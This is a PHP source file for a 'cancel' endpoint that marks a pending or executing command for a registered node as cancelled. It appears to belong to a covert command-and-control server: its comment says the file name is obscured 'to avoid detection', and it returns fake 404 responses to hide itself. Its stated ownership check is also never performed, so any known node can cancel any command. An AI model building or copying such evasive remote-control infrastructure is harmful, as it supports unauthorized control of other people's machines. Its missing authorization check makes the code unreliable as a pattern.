<?php
/**
 * cancel.php - Cancel command endpoint
 * Obscured name to avoid detection
 */

require_once __DIR__ . '/config.php';

header('Content-Type: application/json');

if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    send404();
}

$validated = validateRequest();
$db = getDB();

if (!$db) {
    sendJSON(['error' => 'Service unavailable'], 503);
}

try {
    $nodeId = $validated['node_id'];
    $body = $validated['body'];
    
    // Get node ID
    $stmt = $db->prepare("SELECT id FROM nodes WHERE node_id_hash = ?");
    $stmt->execute([$nodeId]);
    $node = $stmt->fetch();
    
    if (!$node) {
        send404();
    }
    
    $commandId = $body['command_id'] ?? null;
    if (!$commandId) {
        sendJSON(['error' => 'Missing command_id'], 400);
    }
    
    // Verify command belongs to this node or user has permission
    $cmdStmt = $db->prepare("
        SELECT id, node_id, status
        FROM commands
        WHERE id = ?
    ");
    $cmdStmt->execute([$commandId]);
    $command = $cmdStmt->fetch();
    
    if (!$command) {
        sendJSON(['error' => 'Command not found'], 404);
    }
    
    // Check if command can be cancelled
    if ($command['status'] !== 'pending' && $command['status'] !== 'executing') {
        sendJSON(['error' => 'Command cannot be cancelled (already ' . $command['status'] . ')'], 400);
    }
    
    // Update command status to cancelled
    $updateStmt = $db->prepare("
        UPDATE commands
        SET status = 'cancelled'
        WHERE id = ?
    ");
    $updateStmt->execute([$commandId]);
    
    sendJSON([
        'status' => 'ok',
        'message' => 'Command cancelled',
        'command_id' => $commandId
    ]);
    
} catch (PDOException $e) {
    error_log("Cancel error: " . $e->getMessage());
    send404();
}

?>

